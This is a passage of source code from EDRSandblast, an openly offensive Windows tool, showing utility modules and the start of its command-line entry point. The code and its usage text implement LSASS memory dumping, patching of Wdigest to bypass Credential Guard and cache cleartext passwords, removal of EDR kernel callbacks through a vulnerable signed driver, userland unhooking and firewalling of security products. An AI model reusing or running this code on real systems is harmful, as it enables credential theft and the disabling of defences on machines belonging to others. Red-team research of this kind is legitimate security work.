    }

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
    if (length) {
        for (size_t n = 0; n < length; n++) {
            int key = rand() % (int)(sizeof charset - 1);
            str[n] = charset[key];
        }
        str[length] = '\0';
    }
    return str;
}


TCHAR* allocAndGenerateRandomString(size_t length) {
    LPTSTR str = calloc(length + 1, sizeof(TCHAR));
    if (str == NULL) {
        return NULL;
    }
    generateRandomString(str, length);
    return str;
}

```

`EDRSandblast/Utils/SyscallProcessUtils.c`:

```c
#include "SyscallProcessUtils.h"

// Retrieve a given process PID.
DWORD SandGetProcessPID(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION basicInformation;
    basicInformation.UniqueProcessId = 0;
    PROCESSINFOCLASS ProcessInformationClass = 0;

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessInformationClass, &basicInformation, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Couldn't retrieve process PID as NtQueryInformationProcess syscall failed with error 0x%x.\n"), status);
        return 0;
    }

    return (DWORD) basicInformation.UniqueProcessId;
}

// Retrieve a given process image (PE full path).
PUNICODE_STRING SandGetProcessImage(HANDLE hProcess) {
    NTSTATUS status;
    ULONG ProcessImageLength = 1;
    PUNICODE_STRING ProcessImageBuffer = NULL;

    do {
        ProcessImageBuffer = calloc(ProcessImageLength, sizeof(TCHAR));
        if (!ProcessImageBuffer) {
            _tprintf_or_not(TEXT("[-] Couldn't allocate memory for process image\n"));
            return NULL;
        }

        status = NtQueryInformationProcess(hProcess, ProcessImageFileName, ProcessImageBuffer, ProcessImageLength, &ProcessImageLength);
        if (NT_SUCCESS(status)) {
            break;
        }

        free(ProcessImageBuffer);
        ProcessImageBuffer = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!ProcessImageBuffer) {
        _tprintf_or_not(TEXT("[-] Failed to retrieve process image\n"));
        return NULL;
    }
    
    return ProcessImageBuffer;
}

// Extract filename from process image full path.
DWORD SandGetProcessFilename(PUNICODE_STRING ProcessImageUnicodeStr, TCHAR* ImageFileName, DWORD nSize) {
    if (ProcessImageUnicodeStr->Length == 0) {
        return 0;
    }

    // Process name will be /binary.exe.
    TCHAR* ProcessName = _tcsrchr(ProcessImageUnicodeStr->Buffer, TEXT('\\'));
    if (!ProcessName) {
        return 0;
    }

    // Skip the /.
    ProcessName = &ProcessName[1];
    
    DWORD ProcessNameLength = (DWORD)_tcslen(ProcessName);
    if (ProcessNameLength > nSize) {
        _tprintf_or_not(TEXT("[-] Input buffer size is too small for file name\n"));
        return 0;
    }
    
    _tcsncat_s(ImageFileName, nSize, ProcessName, _TRUNCATE);
    return ProcessNameLength;
}

// Find a process PID using its filename.
DWORD SandFindProcessPidByName(TCHAR* targetProcessName, DWORD* pPid) {
    DWORD status = STATUS_UNSUCCESSFUL;
    HANDLE hProcess = NULL;
    PUNICODE_STRING currentProcessImage = NULL;
    TCHAR* currentProcessName = NULL;
    DWORD currentProcessNameSz = 0;
    
    *pPid = 0;

    while (*pPid == 0) {
        status = NtGetNextProcess(hProcess, PROCESS_QUERY_INFORMATION, 0, 0, &hProcess);

        if (status == STATUS_NO_MORE_ENTRIES) {
            _tprintf_or_not(TEXT("[-] The process '%s' was not found\n"), targetProcessName);
            return STATUS_NO_MORE_ENTRIES;
        }
        else if (!NT_SUCCESS(status)) {
            _tprintf_or_not(TEXT("[-] Syscall NtGetNextProcess failed with error 0x%x.\n"), status);
            return status;
        }

        currentProcessImage = SandGetProcessImage(hProcess);
        currentProcessName = calloc(currentProcessImage->MaximumLength, sizeof(TCHAR));
        if (!currentProcessName) {
            _tprintf_or_not(TEXT("[-] Couldn't allocate memory for process filename\n"));
            return STATUS_UNSUCCESSFUL;
        }
        currentProcessNameSz = SandGetProcessFilename(currentProcessImage, currentProcessName, currentProcessImage->MaximumLength);

        if (currentProcessNameSz != 0 && !_tcsicmp(targetProcessName, currentProcessName)) {
            *pPid = SandGetProcessPID(hProcess);
            break;
        }

        free(currentProcessImage);
        currentProcessImage = NULL;
        free(currentProcessName);
        currentProcessName = NULL;
    }

    if (*pPid) {
        return STATUS_SUCCES;
    }
    else {
        return STATUS_UNSUCCESSFUL;
    }
}

```

`EDRSandblast/Utils/WdigestOffsets.c`:

```c
/*

--- Functions to bypass Credential Guard by enabling Wdigest through patching of the g_fParameter_UseLogonCredential and g_IsCredGuardEnabled attributes in memory.
--- Full source and credit to https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
--- Code adapted from: https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

*/

#include <tchar.h>
#include <stdio.h>

#include "../EDRSandblast.h"
#include "FileVersion.h"
#include "PdbSymbols.h"

#include "WdigestOffsets.h"

union WdigestOffsets g_wdigestOffsets = { 0 };

// Return the offsets of nt!PspCreateProcessNotifyRoutine, nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine, and nt!_PS_PROTECTION for the specific Windows version in use.
void LoadWdigestOffsetsFromFile(TCHAR* wdigestOffsetFilename) {
    LPTSTR wdigestVersion = GetWdigestVersion();
    _tprintf_or_not(TEXT("[*] System's wdigest.dll file version is: %s\n"), wdigestVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, wdigestOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file not found / invalid. A valid offset file must be specifed!"));
        return;
    }

    TCHAR lineWdigestVersion[256];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineWdigestVersion, _countof(lineWdigestVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (_tcscmp(wdigestVersion, lineWdigestVersion) == 0) {
            TCHAR* endptr;
            _tprintf_or_not(TEXT("[+] Offsets are available for this version of wdigest.dll (%s)!\n"), wdigestVersion);
            for (int i = 0; i < _SUPPORTED_WDIGEST_OFFSETS_END; i++) {
                g_wdigestOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
        }
    }
    fclose(offsetFileStream);
}

void SaveWdigestOffsetsToFile(TCHAR* wdigestOffsetFilename) {
    LPTSTR wdigestVersion = GetWdigestVersion();

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, wdigestOffsetFilename, TEXT("a"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file connot be opened"));
        return;
    }

    _ftprintf(offsetFileStream, TEXT("%s"), wdigestVersion);
    for (int i = 0; i < _SUPPORTED_WDIGEST_OFFSETS_END; i++) {
        _ftprintf(offsetFileStream, TEXT(",%llx"), g_wdigestOffsets.ar[i]);
    }
    _fputts(TEXT(""), offsetFileStream);

    fclose(offsetFileStream);
}


void LoadWdigestOffsetsFromInternet(BOOL delete_pdb) {
    LPTSTR wdigestPath = GetWdigestPath();
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(wdigestPath);
    if (sym_ctx == NULL) {
        return;
    }
    g_wdigestOffsets.st.g_fParameter_UseLogonCredential = GetSymbolOffset(sym_ctx, "g_fParameter_UseLogonCredential");
    g_wdigestOffsets.st.g_IsCredGuardEnabled = GetSymbolOffset(sym_ctx, "g_IsCredGuardEnabled");
    UnloadSymbols(sym_ctx, delete_pdb);
}

TCHAR g_wdigestPath[MAX_PATH] = { 0 };
LPTSTR GetWdigestPath() {
    if (_tcslen(g_wdigestPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute wdigest.dll path.
        _tcscat_s(g_wdigestPath, _countof(g_wdigestPath), systemDirectory);
        _tcscat_s(g_wdigestPath, _countof(g_wdigestPath), TEXT("\\wdigest.dll"));
    }
    return g_wdigestPath;
}

TCHAR g_wdigestVersion[256] = { 0 };
LPTSTR GetWdigestVersion() {
    if (_tcslen(g_wdigestVersion) == 0) {
        LPTSTR wdigestPath = GetWdigestPath();

        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), wdigestPath);

        _stprintf_s(g_wdigestVersion, 256, TEXT("wdigest_%s.dll"), versionBuffer);
    }
    return g_wdigestVersion;
}
```

`EDRSandblast/Utils/WindowsServiceOps.c`:

```c
#include "../EDRSandblast.h"
#include "WindowsServiceOps.h"

BOOL ServiceAddEveryoneAccess(SC_HANDLE serviceHandle) {
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

    EXPLICIT_ACCESS ForEveryoneACL = {
        SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
    };

    if (!QueryServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
        oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded);
        if (oldSd) {
            if (QueryServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryoneACL.Trustee.ptstrName)) {

                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryoneACL, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
                        status = SetServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }

                    FreeSid(ForEveryoneACL.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD ServiceInstall(PCTSTR serviceName, PCTSTR displayName, PCTSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    SC_HANDLE hSC = NULL;
    SC_HANDLE hS = NULL;
    TCHAR absoluteBinPath[MAX_PATH] = { 0 };
    DWORD absLen = GetFullPathName(binPath, _countof(absoluteBinPath), absoluteBinPath, NULL);
    if (absLen == 0) {
        DWORD lastError = GetLastError();
        _tprintf_or_not(TEXT("[*] Error 0x%lx converting \'%s\' path to absolute ...\n"), lastError, binPath);
        return lastError;
    }

    hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSC) {
        hS = OpenService(hSC, serviceName, SERVICE_START);
        if (hS) {
            _tprintf_or_not(TEXT("[+] \'%s\' service already registered\n"), serviceName);
        }

        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                _tprintf_or_not(TEXT("[*] \'%s\' service was not present\n"), serviceName);

                hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, absoluteBinPath, NULL, NULL, NULL, NULL, NULL);

                if (hS) {
                    _tprintf_or_not(TEXT("[+] \'%s\' service is successfully registered\n"), serviceName);
                    if (ServiceAddEveryoneAccess(hS)) {
                        _tprintf_or_not(TEXT("[+] \'%s\' service ACL configured to for Everyone\n"), serviceName);
                    }
                    else {
                        _putts_or_not(TEXT("[!] ServiceAddEveryoneAccess"));
                    }
                }
                else {
                    PRINT_ERROR_AUTO(TEXT("CreateService"));
                }
            }
            else {
                PRINT_ERROR_AUTO(TEXT("OpenService"));
            }
        }

        if (hS) {
            if (startIt) {
                if (StartService(hS, 0, NULL)) {
                    _tprintf_or_not(TEXT("[+] \'%s\' service started\n"), serviceName);
                }
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                    _tprintf_or_not(TEXT("[*] \'%s\' service already started\n"), serviceName);
                }
                else {
                    PRINT_ERROR_AUTO(TEXT("StartService"));
                    return GetLastError();
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }

    else {
        PRINT_ERROR_AUTO(TEXT("OpenSCManager(create)"));
        return GetLastError();
    }
    return 0x0;
}

BOOL ServiceGenericControl(PCTSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
    BOOL status = FALSE;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (hSC) {
        hS = OpenService(hSC, serviceName, dwDesiredAccess);
        if (hS) {
            status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return status;
}

BOOL ServiceUninstall(PCTSTR serviceName, DWORD attemptCount) {

    // Used as a stop point for recursive calls to ServiceUninstall.
    if (attemptCount > MAX_UNINSTALL_ATTEMPTS) {
        _tprintf_or_not(TEXT("[!] Reached maximun number of attempts (%i) to uninstall the service \'%s\'\n"), MAX_UNINSTALL_ATTEMPTS, serviceName);
        return FALSE;
    }

    if (ServiceGenericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
        _tprintf_or_not(TEXT("[+] \'%s\' service stopped\n"), serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        _tprintf_or_not(TEXT("[*] \'%s\' service not running\n"), serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_CANNOT_ACCEPT_CTRL) {
        _tprintf_or_not(TEXT("[*] \'%s\' service cannot accept control messages at this time, waiting...\n"), serviceName);
        Sleep(OP_SLEEP_TIME);
    }
    else {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
        Sleep(OP_SLEEP_TIME);
        return ServiceUninstall(serviceName, attemptCount + 1);
    }

    SERVICE_STATUS status;
    BOOL deleted = FALSE;
    SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (hSC) {
        SC_HANDLE hS = OpenService(hSC, serviceName, SERVICE_QUERY_STATUS | DELETE);
        if (hS) {
            if (QueryServiceStatus(hS, &status)) {
                if (!(status.dwCurrentState == SERVICE_STOPPED)) {
                    CloseServiceHandle(hS);
                    CloseServiceHandle(hSC);
                    Sleep(OP_SLEEP_TIME);
                    return ServiceUninstall(serviceName, attemptCount + 1);
                }
                else {
                    deleted = DeleteService(hS);
                    CloseServiceHandle(hS);
                }
            }
        }
        CloseServiceHandle(hSC);
    }
    if (!deleted) {
        Sleep(OP_SLEEP_TIME);
        return ServiceUninstall(serviceName, attemptCount + 1);
    }
    return deleted;
}
```

`EDRSandblast_CLI/EDRSandblast.c`:

```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Tchar.h>
#include <psapi.h>
#include <shlwapi.h>
#include <time.h>

#ifdef _DEBUG
#include <assert.h>
#endif

#include "CredGuard.h"
#include "DriverOps.h"
#include "FileUtils.h"
#include "Firewalling.h"
#include "ETWThreatIntel.h"
#include "KernelCallbacks.h"
#include "KernelMemoryPrimitives.h"
#include "ProcessDump.h"
#include "ProcessDumpDirectSyscalls.h"
#include "NtoskrnlOffsets.h"
#include "ObjectCallbacks.h"
#include "PEBBrowse.h"
#include "RunAsPPL.h"
#include "Syscalls.h"
#include "Undoc.h"
#include "UserlandHooks.h"
#include "WdigestOffsets.h"

#include "../EDRSandblast/EDRSandblast.h"

typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
    HANDLE          ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

void PrintBanner() {
    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");   
    const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
    const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
    
    srand(time(NULL));
    int r = rand() % 2;

    _putts_or_not(edrsandblast);
    _tprintf_or_not(TEXT("  %s | %s & %s\n\n"), defcon, authors[r], authors[(r + 1) % 2]);
}

BOOL WasRestarted() {
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG written = 0;
    PE* n = PE_create(getModuleEntryFromNameW(L"ntdll.dll")->DllBase, TRUE);
    NtQueryInformationProcess_f NtQueryInformationProcess = (NtQueryInformationProcess_f)PE_functionAddr(n, "NtQueryInformationProcess"); //TODO : use a less-dirty method
    NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &written);
    DWORD parentPid = (DWORD)pbi.InheritedFromUniqueProcessId;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    CHAR parentImage[MAX_PATH] = { 0 };
    CHAR myImage[MAX_PATH] = { 0 };
    GetProcessImageFileNameA(hParent, parentImage, sizeof(parentImage));
    GetProcessImageFileNameA(GetCurrentProcess(), myImage, sizeof(myImage));
    PE_destroy(n);
    return strcmp(parentImage, myImage) == 0;
}

/*

--- Execution entry point.

*/

int _tmain(int argc, TCHAR** argv) {
    // Parse command line arguments and initialize variables to default values if needed.
    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall> [--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]");
    const TCHAR extendedUsage[] = TEXT("\n\
-h | --help             Show this help message and exit.\n\
-v | --verbose          Enable a more verbose output.\n\
\n\
Actions mode:\n\
\n\
\taudit           Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
\tdump            Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
\t                specified file using -o | --output <DUMP_FILE>.\n\
\tcmd             Open a cmd.exe prompt.\n\
\tcredguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
\t                Credential Guard is enabled on the host. No kernel-land actions required.\n\
\tfirewall        Add Windows firewall rules to block network access for the EDR processes / services.\n\
\n\
--usermode              Perform user-land operations (DLL unhooking).\n\
--kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
\n\
--unhook-method <N>\n   Choose the userland un-hooking technique, from the following: \n\
\n\
\t0               Do not perform any unhooking (used for direct syscalls operations).\n\
\t1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
\t                present userland hooks.\n\
\t2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
\t                allocating an executable trampoline jumping over the hook, and remove all present\n\
\t                userland hooks.\n\
\t3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
\t                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
\t                hooks.\n\
\t4               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
\t                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
\t                present userland hooks.\n\
\t5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
\t                and uses it to remove all detected hooks\n\
--direct-syscalls       Use direct syscalls to conduct the specified action if possible (for now only for process dump).\n\
\n\
Other options:\n\
\n\
--dont-unload-driver                    Keep the vulnerable driver installed on the host\n\
                                        Default to automatically unsinstall the driver.\n\
--no-restore                            Do not restore the EDR drivers' Kernel Callbacks that were removed.\n\
                                        Default to restore the callbacks.\n\
\n\
--driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
                                        Default to 'RTCore64.sys' in the current directory.\n\
--service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
\n\
--nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                        Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
--wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                        (only for the 'credguard' mode).\n\
                                        Default to 'WdigestOffsets.csv' in the current directory.\n\
\n\
--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
                                        anything. This can be useful to audit userland hooking for DLL that are not\n\
                                        loaded by default by this program. Use this option multiple times to load\n\
                                        multiple DLLs all at once.\n\
                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,\n\
                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
\n\
-o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.\n\
                                        Default to 'process_name' in the current directory.\n\
\
-i | --internet                         Enables automatic symbols download from Microsoft Symbol Server\n\
                                        If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use\n\
                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll\n");

    BOOL status;
    HRESULT hrStatus = S_OK;
    TCHAR currentFolderPath[MAX_PATH] = { 0 };
    GetCurrentDirectory(_countof(currentFolderPath), currentFolderPath);

    if (argc < 2) {
        _tprintf_or_not(TEXT("%s"), usage);
        return EXIT_FAILURE;
    }

    START_MODE startMode = none;
    TCHAR driverPath[MAX_PATH] = { 0 };
    TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
    TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
    TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
    TCHAR processName[] = TEXT("lsass.exe");
    TCHAR outputPath[MAX_PATH] = { 0 };
    BOOL verbose = FALSE;
    BOOL removeVulnDriver = TRUE;
    BOOL restoreCallbacks = TRUE;
    BOOL userMode = FALSE;
    BOOL internet = FALSE;
    enum UNHOOK_METHOD_e unhook_method = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
    BOOL directSyscalls = FALSE;
    BOOL kernelMode = FALSE;
    int lpExitCode = EXIT_SUCCESS;
    struct FOUND_EDR_CALLBACKS* foundEDRDrivers = NULL;
    BOOL ETWTIState = FALSE;
    BOOL foundNotifyRoutineCallbacks = FALSE;
    BOOL foundObjectCallbacks = FALSE;
    HOOK* hooks = NULL;
    //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)


    for (int i = 1; i < argc; i++) {
        if (_tcsicmp(argv[i], TEXT("dump")) == 0) {
            startMode = dump;
        }
        else if (_tcsicmp(argv[i], TEXT("cmd")) == 0) {
            startMode = cmd;
        }
        else if (_tcsicmp(argv[i], TEXT("credguard")) == 0) {
            startMode = credguard;
        }
        else if (_tcsicmp(argv[i], TEXT("audit")) == 0) {
            startMode = audit;
        }
        else if (_tcsicmp(argv[i], TEXT("firewall")) == 0) {
            startMode = firewall;
        }
        else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
            _putts_or_not(usage);
            _putts_or_not(extendedUsage);
            return EXIT_SUCCESS;
        }
        else if (_tcsicmp(argv[i], TEXT("-v")) == 0 || _tcsicmp(argv[i], TEXT("--verbose")) == 0) {
            verbose = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--usermode")) == 0) {
            userMode = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--kernelmode")) == 0) {
            kernelMode = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--dont-unload-driver")) == 0) {
            removeVulnDriver = FALSE;
        }
        else if (_tcsicmp(argv[i], TEXT("--no-restore")) == 0) {
            restoreCallbacks = FALSE;
        }
        else if (_tcsicmp(argv[i], TEXT("--driver")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(driverPath, _countof(driverPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            SetDriverServiceName(argv[i]);
        }
        else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--wdigest-offsets")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("-o")) == 0 || _tcsicmp(argv[i], TEXT("--dump-output")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(outputPath, _countof(outputPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--process-name")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(processName, _countof(processName), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--unhook-method")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            unhook_method = _ttoi(argv[i]);
        }
        else if (_tcsicmp(argv[i], TEXT("--direct-syscalls")) == 0) {
            directSyscalls = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--add-dll")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            HANDLE hAdditionnalLib = LoadLibrary(argv[i]);
            if (hAdditionnalLib == INVALID_HANDLE_VALUE) {
                _tprintf_or_not(TEXT("Library %s could not have been loaded, exiting...\n"), argv[i]);
                return EXIT_FAILURE;
            }
        }
        else if (_tcsicmp(argv[i], TEXT("-i")) == 0 || _tcsicmp(argv[i], TEXT("--internet")) == 0) {
            internet = TRUE;
        }
        else {
            _tprintf_or_not(TEXT("%s"), usage);
            return EXIT_FAILURE;
        }
    }

    if (WasRestarted()) {
        removeVulnDriver = FALSE;
    }
    else {
        PrintBanner();
    }

    // Command line option consistency checks.
    if (startMode == none){
        _putts_or_not(TEXT("[!] You did not provide an action to perform: audit, dump, credguard or cmd"));
        return EXIT_FAILURE;
    }
    if (startMode == cmd && !kernelMode) {
        _putts_or_not(TEXT("'cmd' mode needs kernel-land unhooking to work, please enable --kernelmode"));
        return EXIT_FAILURE;
    }
    if (!userMode && !kernelMode) {
        _putts_or_not(TEXT("[!] You did not provide at least one option between --usermode and --kernelmode. Enabling --usermode by default...\n"));
        userMode = TRUE;
    }
    if (!userMode && kernelMode) {
        _putts_or_not(TEXT("[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)\n"));
    }
    if (startMode == credguard && !kernelMode) {
        _putts_or_not(TEXT("[!] Credential Guard bypass might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
    }
    if (startMode == dump && !kernelMode) {
        _putts_or_not(TEXT("[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
    }

    // TODO: set isSafeToExecutePayloadUserland by unhook to TRUE / FALSE if there are still hooks.
    BOOL isSafeToExecutePayloadUserland = TRUE;
    BOOL isSafeToExecutePayloadKernelland = TRUE;

    if (userMode) {
        _putts_or_not(TEXT("[===== USER MODE =====]\n"));
        _putts_or_not(TEXT("[+] Detecting userland hooks in all loaded DLLs..."));
        hooks = searchHooks(NULL);
        _putts_or_not(TEXT(""));

        if (startMode != audit && unhook_method != UNHOOK_NONE) {
            if (hooks->disk_function != NULL) {
                _putts_or_not(TEXT("[+] [Hooks]\tRemoving detected userland hooks..."));
            }
            for (HOOK* ptr = hooks; ptr->disk_function != NULL; ptr++) {
                printf_or_not("[+] [Hooks]\tUnhooking %s using method %ld...\n", ptr->functionName, unhook_method);
                // TODO: return if all hook could be removed and set isSafeToExecutePayloadUserland.
                unhook(ptr, unhook_method);
            }
        }
        _putts_or_not(TEXT(""));
